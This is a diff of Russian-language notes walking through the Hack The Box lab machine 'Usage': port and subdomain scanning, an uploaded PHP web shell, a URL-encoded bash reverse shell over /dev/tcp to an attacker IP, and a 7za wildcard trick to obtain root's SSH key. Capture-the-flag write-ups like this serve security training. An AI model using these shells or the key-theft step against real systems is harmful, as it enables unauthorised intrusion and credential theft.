@@ -1,7 +1,7 @@
 https://app.hackthebox.com/machines/Usage
 
 Сканим
-nmap -p 22,80 -sCV 10.10.11.18
+nmap -p 22,80 -sV -sC -Pn 10.10.11.18
 Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-12 13:35 EDT
 Nmap scan report for 10.10.11.18
 Host is up (0.086s latency).
@@ -17,7 +17,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ffuf -u http://10.10.11.18 -H "Host: FUZZ.usage.htb" -w  /home/kali/Desktop/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
 
-Получаем:
+Рещультат фаззинга:
 admin                   [Status: 200, Size: 3304...
 
 Прописываем себе:
@@ -89,18 +89,26 @@ http://admin.usage.htb/uploads/images/maxhacker.php
 http://admin.usage.htb/uploads/images/maxhacker.php?cmd=id
 
 
+
 Шелл через /dev/tcp;
 
 http://admin.usage.htb/uploads/images/maxhacker.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.16.23/4545%200%3E%261%27
 
+
+
 поиск кредов для повышения в файлах пользователей;
 
+
+
 оставленный на машине исполняемый ELF файл для бэкапирования и танцы с бубном над ним (sudo -l);
+
+
 
 Эксплоит "7za wildcard" и добыча файла id_rsa рута через костыли;
 
 
 
 /usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- @whatever whatever
+
 
 
